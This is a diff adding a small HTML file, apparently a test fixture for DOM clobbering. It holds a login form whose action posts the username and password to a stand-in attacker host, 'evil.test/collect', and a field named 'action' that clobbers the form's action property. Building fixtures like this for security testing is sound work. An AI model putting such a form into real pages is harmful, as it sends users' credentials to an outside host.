@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Clobbered form action</title>
+  </head>
+  <body>
+    <form id="login" method="post" action="http://evil.test/collect">
+      <input type="text" name="action" />
+      <input type="text" id="username" name="username" autocomplete="username" />
+      <input type="password" id="password" name="password" autocomplete="current-password" />
+      <button type="submit">Sign in</button>
+    </form>
+  </body>
+</html>
